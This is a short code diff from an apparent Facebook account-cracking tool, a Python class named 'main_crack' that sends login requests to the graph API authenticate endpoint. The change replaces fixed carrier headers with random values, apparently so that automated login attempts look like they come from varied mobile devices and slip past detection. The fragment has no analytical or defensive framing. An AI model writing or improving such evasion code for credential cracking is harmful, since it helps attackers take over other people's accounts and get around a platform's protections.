@@ -464,13 +464,12 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-
                 headers = {'User-Agent':randFBAN(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '38763'
-'X-FB-SIM-HNI': '29337'
-'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'unknown',
 'X-Tigon-Is-Retry': 'False',
 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
 'x-fb-device-group': '5120',
